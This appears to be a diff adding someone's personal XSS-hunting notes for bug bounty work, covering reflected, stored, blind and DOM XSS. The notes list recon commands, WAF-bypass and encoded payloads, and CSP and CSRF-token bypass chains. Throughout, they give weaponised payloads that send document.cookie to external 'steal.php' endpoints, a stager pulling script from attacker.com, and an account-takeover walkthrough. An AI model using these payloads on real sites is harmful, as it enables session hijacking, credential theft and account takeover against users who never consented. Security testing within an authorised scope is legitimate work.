@@ -1,0 +1,214 @@
+
+Xss
+REFLECTED
+1)
+Use Gau or Wayback urls to passively gather urls of the target.
+Filter the parameters using grep "=" or gf patterns and store it in a new file.
+Now run Gxss or bxss on that new file.
+Check Reflected Param Manually or use some tool like dalfox
+
+ANALYSIS
+$cat domains.txt | gau --threads 5 > output.txt                                i think in order to reduce noice, i will stick with in scope url //time shall tell
+grep '=' output.txt | grep '&' > filtered_urls.txt     or  grep '=' urls.txt | grep -vE '\.(jpg|png|css|js|ico|gif|...)$' > filtered_urls.txt
+       
+ cat filtered_url.txt | bxss -appendMode -payload '"><script src=https://hacker.xss.ht></script>' -parameters
+     OR
+   cat filtered_url.txt | bxss -payload '"><script src=https://z0id.xss.ht></script>' -header "X-Forwarded-For"  or use another payload
+   then 
+   cat urls.txt | dalfox pipe -f payloads.txt           remember, that the payload.txt is the list of your xss payload in a file
+   
+   
+   **Tips***  FOR XSS FIREWALL BYOASS
+   Check if the firewall is blocking only lowercase
+   examples:     <scRipT>alert(1)</scRipT>
+   
+   Try to break firewall regex with the new line(\r\n)
+   Ex:- <script>%0alert(1)</script>
+   
+   Try Double Encoding
+   Ex:- %2522
+   
+   Testing for recursive filters, if firewall removes text in red, we will have clear payload
+   Ex:- <src<script>ipt>alert(1);</scr</script>ipt>
+   
+   Injecting anchor tag without whitespaces
+    Ex:- <a/href="j&Tab;a&Tab;v&Tab;asc&Tab;ri&Tab;pt:alert&lpar;1&rpar;">
+    
+    Try to bypass whitespaces using Bullet
+    Ex:- <svg•onload=alert(1)>
+    
+    Try to change request method
+    Ex:- GET /?q=xss  POST/ q=xss
+    
+    Try CRLF Inection
+    Ex:- GET /%0A%ODValue=%20Virus
+     POST 
+     Value= Virus
+     
+     
+     exception marked as on //
+     input on text boxes A<h1>A.
+     document.location='https://ł.rip/save.php?c='+document.cookie;    this for stealing cookies
+     
+    
+   
+2)
+Using Burp
+Download Reflection and sentinal plugin for burp.
+Walk and spider the target site.
+Check the reflected params tab in burp
+send that sentinal or check manually.
+
+3)
+Use Methods 1 or 2 to Gather the urls
+Enumerate the Firewall using https://github.com/Ekultek/WhatWaf or other similar tool.
+Find WAF bypass payload on twitter by searching or in this Github Repo https://github.com/0xInfection/Awesome-WAF
+Also Use Arjun to find hidden params.
+
+4
+Find Hidden Variables In Source Code.
+Check Javascript file or html Source file for hidden or unused variables
+You can Manually Check Right Click View Page Source and search for var= , ="" , =''.
+Now Append that to webpage urls. For example https://example.com?hiddenvariablename=xss.
+
+Tips
+Check the error pages (404,403,..) sometimes they contain reflected values
+Trigger a 403 by trying to get the .htaccess file
+Try every reflected parameter
+
+
+STORED XSS  ARE MOSTLY FOUND MANUALLY
+
+
+Enumerate the Firewall using above Methods and select a payload to test accordingly.
+Try that selected WAF bypass payload while registering on a site in fields like username, name, address, email, etc.
+Try Payload in File name of profile picture and also in the source file of image.
+Try in Comment section anywhere on target site.
+Try on every input fields which get reflected in page and which can be seen by other users.
+Try to signup using your name + xss payload and that can lead to stored xss.
+
+analysis 
+************TIP******
+inject  <a href=#>test</a>  in every  Input fields such as  text boxes, text areas, drop-down lists, checkboxes, radio buttons, and more.
+and then trry to obfuscated payods
+FOR WAF BYPASS for STORED xss
+ 
+wheere payload  is <script>alert('XSS')</script>  // check for more strong xss payloads and run the following encode payload //  use chapgpt to genearte encoding payloads
+encode payload
+
+XSS polygot
+jaVasCript:/*-/*`/*`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>x3csVg/<sVg/oNloAd=alert()//>x3e
+
+      basic xss filter bypass
+      1) using ann html img tag instead of script
+      2)when alert is blocked, prompt can be used ...  alert (1) to prompt(1)
+      3) backtrick can be used when bracket is filter ....  alert(1) to alert`1`  or use alert(String.fromCharCode(88,83,83)) when string are blocked
+      
+      
+
+url encoding of payload 
+`%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%27%58%53%53%27%29%3C%2F%73%63%72%69%70%74%3E`    
+
+Hex encoding of payload
+`\x3C\x73\x63\x72\x69\x70\x74\x3E\x61\x6C\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29\x3C\x2F\x73\x63\x72\x69\x70\x74\x3E`
+
+BASE 64
+PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
+
+unicode encodng
+\u003C\u0073\u0063\u0072\u0069\u0070\u0074\u003E\u0061\u006C\u0065\u0072\u0074\u0028\u0027\u0058\u0053\u0053\u0027\u0029\u003C\u002F\u0073\u0063\u0072\u0069\u0070\u0074\u003E
+
+
+USING COMBINATION OF ALL TECHNIQUES
+
+URL Encoding + Hex Encoding:
+
+
+Base64 Encoding + Unicode Encoding:  and 
+
+combination of all technique 
+
+
+Blind XSS
+Use burpcollaborator or ngrok
+
+1- Review forms
+2- Contact Us pages
+3- Passwords(You never know if the other side doesn’t properly handle input and if your password is in View mode)
+4- Address fields of e-commerce sites
+5- First or Last Name field while doing Credit Card Payments
+6- Set User-Agent to a Blind XSS payload. You can do that easily from a proxy such as Burpsuite.
+7- Log Viewers
+8- Feedback Page
+9- Chat Applications
+10- Any app that requires user moderation
+
+DOM XSS
+Tips
+Would not recommend manually looking for DOM XSS
+Burp suite PRO scanner can find DOM XSS
+Tool: https://github.com/dpnishant/ra2-dom-xss-scanner
+
+
+
+    idea (someone) for finding xss
+amass enum -d target.com -o /filepath/subdomains.txt
+ sort -u subdomains.txt | httprobe > /filepath/uniq.txt
+ eyewitness --web -f uniq.txt -d /path_to_save_screenshots
+ paramspider -d target.com > /filepath/param.txt
+ dalfox -b hahwul.xss.ht file param.txt
+
+        
+        use the browerser console to alwys poop out and check payload on a given page 
+  including long payloads/ escalation of xss beyond alert box
+  <script src="http://nw.rs"></script>
+  getScript("http://nw.rs",function(){});    this is by using jquery 
+  
+ Note //  if you are exploiting an XSS on a page that uses HTTPS, you will need to pull the XSS payload from a link that also uses HTTPS, otherwise the browser will refuse to load it with a “Mixed Content” error. because of cors 
+ 
+ Bypassing CSRF Tokens //
+ by loading the form within an iframe. If the page is loaded within an iframe, then the form will automatically include the CSRF token within the form, 
+ 
+ once we bypass sop and csrf token then ACCOUNT TAKEOVER 
+ 
+ Change the user’s password
+Change the user’s email address or phone number to our own, and then use the forgot password functionality to update their password
+Change the user’s security questions
+
+ // the shortest payload I know of that does not pull an external script is 20 characters long  it is used when there is less than 20 character string     <svg/onload=alert()>
+ 
+ 
+ session hijacking payload  on an form 
+ <script>
+var sessionId = document.cookie.match(/sessionId=(.*?)(;|$)/)[1]
+</script>
+
+payload for a data theft using xss
+
+<script>
+var stolenCookies = document.cookie;
+var xhr = new XMLHttpRequest();
+xhr.open('GET', 'https://yourserver.com/steal.php?data=' + encodeURIComponent(stolenCookies), true);
+xhr.send();
+</script>
+
+
+($$ \unicode{<img src=1 onerror=alert(1)>} $$) 
+
+
+  WEAPONING XSS
+  
+NOTE: WHEN having a simple XSS in alert form But when we attempted to demonstrate its impact or leverage it beyond an alert we have nothing! Thankfully, if you find yourself in this situation, you can write a compact XSS stager with 98 characters using the following JavaScript syntax (note, you could save a few more characters by registering a shorter domain name and using an index page):   
+  <svg/onload=body.appendChild(document.createElement`script`).src='https://attacker.com/p' hidden/>
+  
+ NOTE:  when injecting an  XSS payload let say we excute the alert(1)” payload, and the page got empty we notice something is wrong in the background. Some of the page is missing... So why can’t we access it? The problem is with our injection point; where it is in the page. If you're injecting code before an element you need to access, you first need to wait for the DOM to finish being built before your code executes. This is because the page is built "top-to-bottom" and in this case our payload is injected into the “To” field which comes before the "csrf" token field. As such the “csrf” element does not yet exist at the time of execution as the DOM hasn’t finished being built! This is why some elements are missing when we execute an alert.
+  
+To compensate for this, you can attach an event listener to the document which will trigger your code once the DOM has completed its loading process. As ever, there are multiple ways to do this but the “by design” event for handling this is called “DOMContentLoaded”, and can be used as follows:
+
+  ?name="><script>document.addEventListener("DOMContentLoaded",()=>alert(csrf.value))</script><link/rel="
+  
+  when CSP is not your friend   "lol". We can no longer execute inline JS, so we cannot directly inject a reflected XSS payload. Furthermore, we now also can’t load JS resources outside of the application’s own origin ..  To bypass the CSP policy and get back to our ever-reliable alert box we can use this 2nd injection URL as the source for the first XSS injection script - think XSS-inception (Remember to use double URL encoding):
+   
+   ?name=Bob<script src='https://demoapp.loc/js/script?v=1.7.3.css%2522/>%2527)%3Balert(%2522Yeah!%2520Chaining!%2522)%3B//'></script>
+  
+ NOTE:    allow try to copying CSRF token from a different browser session and see if you can reuse it // this could to lead to chainging xss with csrf AND CSRF BYPASS
